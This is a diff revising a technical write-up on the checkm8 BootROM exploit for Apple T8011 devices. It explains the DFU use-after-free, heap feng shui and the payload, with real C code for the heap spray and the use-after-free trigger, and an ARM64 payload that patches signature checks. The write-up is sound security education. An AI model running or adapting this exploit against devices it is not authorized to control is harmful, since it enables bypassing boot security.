@@ -22,7 +22,7 @@
   - [The payload](#the-payload)
     - [The overwrite](#the-overwrite)
   - [Executing the payload](#executing-the-payload)
-    - [The actual payload](#the-actual-payload)
+    - [Explaining the payload](#explaining-the-payload)
 - [Conclusion](#conclusion)
 
 # Analysis
@@ -77,10 +77,10 @@ Information to take away from this:
 ### Initial request handling
 When a USB control transfer is received by DFU, the `usb_core_handle_usb_control_receive()` is called. This function finds the registered interface for handling DFU requests and then calls the `handle_request()` function of that interface. In our case, this is the `handle_interface_request()` function, and the following code shows the control flow in the case of the host transferring data to the device. It checks whether the direction of the transfer is host-to-device or device-to-host, and then acts on the request in order to determine what to do next.
 
-In the case of downloading data, which is what we will be using as part of the vulnerability, it will return one of three outcomes:
+In the case of downloading data, which is key for understanding this vulnerability, it will return one of three outcomes:
 * **0** - the transfer is completed
 * **-1** - the wLength exceeds the size of the IO buffer
-* **wLength from the request** - the device is ready to receive the data and is expecting wLength bytes
+* **wLength from the setup packet** - the device is ready to receive the data and is expecting `wLength` bytes
 ```c
 int handle_interface_request(struct usb_device_request *request, uint8_t **out_buffer)
 {
@@ -233,7 +233,7 @@ if (io_buffer) {
 ```
 
 So, by following the paper trail, we can see that:
-* Not completing the data phase results in the global variables not being cleared
+* Not completing the data phase results in the global variables remaining intact
 * Sending a `DFU_ABORT` command results in the `dfuDone` global variable being set to true
 * This causes `usb_quiesce()` to be called, leading to the IO buffer being freed
 * `getDFUImage()` returns, and is called again upon re-entry
@@ -241,6 +241,8 @@ So, by following the paper trail, we can see that:
 * The global variable pointing to the IO buffer remains, but points to the now-freed buffer
 
 As I'm sure you can now tell, this is a use-after-free vulnerability, and it is the one utilised by checkm8. Next, I will go into how this vulnerability can be exploited, in order to gain code execution on the device. However, before it can be exploited, a certain memory leak is required.
+
+If you're particularly eagle-eyed, you may have noticed that once another request was sent to the device with a `bRequest` of `DFU_DNLOAD` after triggering the use-after-free, the global variables would just be set to the new values. The way this is worked around is that no requests will be sent that satisfy the conditions in order for this to happen between the use-after-free being triggered and the overwrite being sent. Once the overwrite is in place at the beginning of the freed buffer, we can send the payload using a `DFU_DNLOAD` request into the new IO buffer and the overwrite will direct execution to the payload. This will all be explained in _much_ more detail later on.
 
 ## Memory leak
 ### Why is a leak needed?
@@ -265,7 +267,7 @@ struct usb_device_io_request
 There are two fields of this structure that are important in order to understand the memory leak. The `callback` field is a pointer to a function that is called once the request is completed. The `next` field is a pointer to the next `io_request` structure in the linked list of requests.
 
 ### The bug
-If you stall the device-to-host pipe of DFU, where it will not process any requests, you can then cause a large number of allocations by sending a large number of requests during the stalled period. This will result in each request having it's `io_request` structure being allocated and becoming part of the linked list for the endpoint. When you unstall the pipe, you can cause all of these requests to be freed and de-allocated. So, with this, we have the ability to allocate and delay the de-allocation of objects on the heap.
+If you stall the device-to-host pipe of DFU, where it will not process any requests while in the stalled state, you can then cause a large number of allocations by sending a large number of requests during the stalled period. This will result in each request having it's `io_request` structure being allocated and becoming part of the linked list for the endpoint. When you unstall the pipe, you can cause all of these requests to be freed and de-allocated. So, with this, we have the ability to allocate and delay the de-allocation of objects on the heap.
 
 Despite being able to do this, these allocations will not persist through a shut down of the USB stack. For this to be the case, we need a memory leak wherein certain requests are never properly de-allocated. 
 
@@ -291,14 +293,14 @@ There is a second bug that factors into the memory leak - wherein the transfer l
 However, the callbacks invoked during the shut down of the USB stack could have queued new zero-length packet requests, which would then be leaked - and these can be used for heap shaping. Because of how to heap allocator logic works, if the IO buffer is `0x800` bytes and two allocations are leaked that are exactly `0x800` bytes apart, the space in between them will be preferred as the spot for the next `0x800`-sized allocation (A.K.A. the IO buffer upon DFU re-entry). This is due to the heap allocator choosing the smallest possible space for the allocation, of which the space between the two leaked allocations will be the perfect size.
 
 # Exploitation
-Unfortunately, to trigger the use-after-free with an incomplete data phase, you must go beyond the normal boundaries of USB transfers, as defined in the USB specification. There are two solutions for this that have been utilised in the open-source community: firstly, using micro-controllers (such as an Arduino + USB Host Controller) like [this](https://github.com/a1exdandy/checkm8-a5), to gain maximum control over the USB stack of the host device, allowing you to control exactly what is sent and when; secondly, forcing the cancellation of the transfer midway through, as is done in [ipwndfu](https://github.com/aXi0mX/ipwndfu) by using an extremely short timeout on an asynchronous transfer.
+Unfortunately, to trigger the use-after-free with an incomplete data phase, you must go beyond the normal boundaries of USB transfers defined in the USB specification. There are two solutions for this that have been utilised in the open-source community: firstly, using micro-controllers (such as an Arduino + USB Host Controller) like [this](https://github.com/a1exdandy/checkm8-a5), to gain maximum control over the USB stack of the host device, allowing you to control exactly what is sent and when; secondly, forcing the cancellation of the transfer midway through, as is done in [ipwndfu](https://github.com/aXi0mX/ipwndfu) and [gaster](https://github.com/0x7FF/gaster) (amongst others) by using an extremely short timeout on an asynchronous transfer.
 
 The stages of exploitation are as follows:
-* Shaping the heap
+* Shaping the heap (AKA heap feng shui)
 * Trigger the use-after-free vulnerability
 * Sending and executing the payload
 
-The following sections will have code examples for each of these stages - which are taken from my currently-unreleased checkm8-based project.
+The following sections will have code examples for each of these stages - which are taken from my currently-unreleased checkm8-based project but that are heavily based on the [gaster](https://github.com/0x7FF/gaster) implementation. It is also important to note that it is simplified for the T8011 SoC, but certain areas of the exploit are different for the varying SoCs.
 
 ## Heap feng shui
 Heap feng shui is the technique of deliberately manipulating the heap and shaping it to benefit exploitation. Using the memory leak discussed earlier, we can trick the heap allocator into allocating the IO buffer in a different location on re-entry - allowing us to access the freed buffer from the previous iteration of DFU.
@@ -310,9 +312,9 @@ In order to craft the hole for the next IO buffer, we should do the following:
 * Trigger a USB reset so that `usb_quiesce()` is called and these requests are leaked.
 * Be left with a hole that can be used to control allocation of the next IO buffer.
 
-Accounting for all heap allocations being rounded up to the nearest multiple of `0x40`, and the `0x40`-sized header for each packet, we can safely assume that each `io_request` object will occupy `0x80` bytes on the heap. So, one strategy for heap feng shui would be to send `0x10` non-leaking packets to the device, which would create a hole of size `0x800` - which is exactly the size of the IO buffer. Testing this strategy proved it to be successful in exploitation.
+Accounting for all heap allocations being rounded up to the nearest multiple of `0x40`, and the `0x40`-sized header for each packet, we can safely assume that each `io_request` object will occupy `0x80` bytes on the heap. So, one strategy for heap feng shui would be to send `0x10` non-leaking packets to the device, which would create a hole of size `0x800` - which is exactly the size of the IO buffer. Testing this strategy proved it to be successful in exploitation, but this is not the solution that was chosen.
 
-However, a quicker and more simple strategy (which is utilised in most implementations) is to send enough packets that a hole will be created that is smaller than `0x800`, but big enough that allocations will end up being shuffled around enough so that the IO buffer is allocated elsewhere upon re-entry. This is the strategy used in the function shown below, and it makes the exploit quicker.
+A quicker, and more simple, strategy (which is utilised in most implementations of the exploit) is to send the _bare minimum_ number of packets such that a hole will be created that is smaller than `0x800`, but big enough that allocations will end up being shuffled around enough so that the IO buffer is allocated elsewhere upon re-entry. This is the strategy used in the function shown below, and it makes the exploit quicker.
 
 Here's the heap spray function from my project, which is adapted for the T8011 BootROM:
 ```c
@@ -328,7 +330,7 @@ bool checkm8HeapSpray(device_t *device)
     return true;
 }
 ```
-I'll walk through the function step-by-step.
+I'll walk through the function step-by-step:
 
 ```c
 checkm8Stall(device)
@@ -374,7 +376,7 @@ The heap allocator will then allocate objects inside this hole enough to shuffle
 ```c
 checkm8NoLeak(device)
 ```
-This will send a request that does not leak a zero-length packet, which will be de-allocated when the USB stack is quiesced. The `checkm8NoLeak()` transfer has a `wLength` of `0xC1`, which is the highest of all the transfers used in heap feng shui. As a result, it will mean that the host is requesting more bytes in the setup packet, which will result in the conditions being met in order to the additional zero-length packet to be sent.
+This will send a request that does not leak a zero-length packet, which will be de-allocated when the USB stack is quiesced. The `checkm8NoLeak()` transfer has a `wLength` of `0xC1`, which is the highest of all the transfers used in heap feng shui. As a result, it will mean that the host is requesting more bytes in the setup packet, which will result in the conditions being met in order for the additional zero-length packets to be sent and then leaked.
 
 At this point, we will have the heap in such a state that the next IO buffer will be allocated in a location other than the standard address, which is occupied by the freed buffer. If the new IO buffer were to be allocated in the same place, we would not be able to exploit the use-after-free vulnerability as the freed buffer would be overwritten.
 
@@ -391,21 +393,21 @@ Here's my function that triggers the use-after-free:
 bool checkm8TriggerUaF(device_t *device)
 {
   unsigned usbAbortTimeout = 10;
-	transfer_ret_t transferRet;
+  transfer_ret_t transferRet;
 
-	while(sendUSBControlRequestAsyncNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, 0x800, usbAbortTimeout, &transferRet)) {
-		if(transferRet.sz < config.overwritePadding 
-        && sendUSBControlRequestNoData(&device->handle, 0, 0, 0, 0, config.overwritePadding - transferRet.sz, &transferRet) 
-        && transferRet.ret == USB_TRANSFER_STALL) {
-			sendUSBControlRequestNoData(&device->handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
-			return true;
-		}
-		if(!sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SIZE, NULL)) {
-			break;
-		}
-		usbAbortTimeout = (usbAbortTimeout + 1) % 10;
-	}
-	return false;
+  while(sendUSBControlRequestAsyncNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, 0x800, usbAbortTimeout, &transferRet)) {
+    if(transferRet.sz < config.overwritePadding 
+    && sendUSBControlRequestNoData(&device->handle, 0, 0, 0, 0, config.overwritePadding - transferRet.sz, &transferRet) 
+    && transferRet.ret == USB_TRANSFER_STALL) {
+      sendUSBControlRequestNoData(&device->handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
+      return true;
+    }
+    if(!sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SIZE, NULL)) {
+      break;
+    }
+    usbAbortTimeout = (usbAbortTimeout + 1) % 10;
+  }
+  return false;
 }
 ```
 
@@ -437,10 +439,14 @@ After this, the IO buffer from the first iteration has been freed while the glob
 Next, we need to send our overwrite and payload in order to give us full arbitrary code execution.
 
 ## The payload
-The payload is the machine code that we send to the device to be executed as part of the exploitation process. It is sent in two parts:
+The payload as a whole is the data that we send to the device to grant us full execution over the device as part of the exploitation process. It is sent in two parts:
 * The overwrite
 * The actual payload
+
 The overwrite is the data that we send to the device in order to overwrite the `callback` and `next` fields of an `io_request` structure. This will then direct the execution flow to the main payload.
+
+The main payload is the machine code that performs actions such as amending the USB serial number and patching signature checks to allow unsigned images to boot on the device.
+
 ### The overwrite
 For the overwrite, the `callback` and `next` fields in the `io_request` structure at the beginning of the freed buffer need to be overwritten. Both fields are pointers to areas in memory - `callback` being a pointer to the callback function and `next` being a pointer to the next `io_request` structure in the linked list of pending requests.
 
@@ -490,41 +496,41 @@ When it reaches our overflown `io_request` object, it will execute the callback 
 
 Now, I will go through the payload and aim to explain exactly what it does at each step.
 
-### The actual payload
+### Explaining the payload
 While ARM64 assembly may seem rather daunting, you will see that it actually makes a lot of sense once you understand what each instruction does. Here is the `_main` function from the main checkm8 payload for T8011, which also contains another label as part of it:
 ```asm
 _main:
-	stp x29, x30, [sp, #-0x10]!
-	ldr x0, =payload_dest
-	ldr x2, =dfu_handle_bus_reset
-	str xzr, [x2]
-	ldr x2, =dfu_handle_request
-	add x1, x0, #0xC
-	str x1, [x2]
-	adr x1, _main
-	ldr x2, =payload_off
-	add x1, x1, x2
-	ldr x2, =payload_sz
-	ldr x3, =memcpy_addr
-	blr x3
-	ldr x0, =gUSBSerialNumber
+  stp x29, x30, [sp, #-0x10]!
+  ldr x0, =payload_dest
+  ldr x2, =dfu_handle_bus_reset
+  str xzr, [x2]
+  ldr x2, =dfu_handle_request
+  add x1, x0, #0xC
+  str x1, [x2]
+  adr x1, _main
+  ldr x2, =payload_off
+  add x1, x1, x2
+  ldr x2, =payload_sz
+  ldr x3, =memcpy_addr
+  blr x3
+  ldr x0, =gUSBSerialNumber
 _find_zero_loop:
-	add x0, x0, #1
-	ldrb w1, [x0]
-	cbnz w1, _find_zero_loop
-	adr x1, PWND_STR
-	ldp x2, x3, [x1]
-	stp x2, x3, [x0]
-	ldr x0, =gUSBSerialNumber
-	ldr x1, =usb_create_string_descriptor
-	blr x1
-	ldr x1, =usb_serial_number_string_descriptor
-	strb w0, [x1]
-	mov w0, #0xD2800000
-	ldr x1, =patch_addr
-	str w0, [x1]
-	ldp x29, x30, [sp], #0x10
-	ret
+  add x0, x0, #1
+  ldrb w1, [x0]
+  cbnz w1, _find_zero_loop
+  adr x1, PWND_STR
+  ldp x2, x3, [x1]
+  stp x2, x3, [x0]
+  ldr x0, =gUSBSerialNumber
+  ldr x1, =usb_create_string_descriptor
+  blr x1
+  ldr x1, =usb_serial_number_string_descriptor
+  strb w0, [x1]
+  mov w0, #0xD2800000
+  ldr x1, =patch_addr
+  str w0, [x1]
+  ldp x29, x30, [sp], #0x10
+  ret
 
 PWND_STR:
 .asciz " PWND:[checkm8]"
@@ -565,9 +571,9 @@ After returning from `memcpy()`, the address of `gUSBSerialNumber` (global USB s
 
 ```
 _find_zero_loop:
-   add x0, x0, #1
-   ldrb w1, [x0]
-   cbnz w1, _find_zero_loop
+  add x0, x0, #1
+  ldrb w1, [x0]
+  cbnz w1, _find_zero_loop
 ```
 This is a loop that will increment the address in `x0` (`gUSBSerialNumber`) by `1` and load the byte at that address into `w1`. If the byte is not zero, it will branch back to `_find_zero_loop` and continue. This will continue until the byte at the address in `x0` is zero, at which point it will continue on to the next instruction. It does this to find the end of the serial number string in memory, so that it can add `PWND:[checkm8]` to the end of it.
 
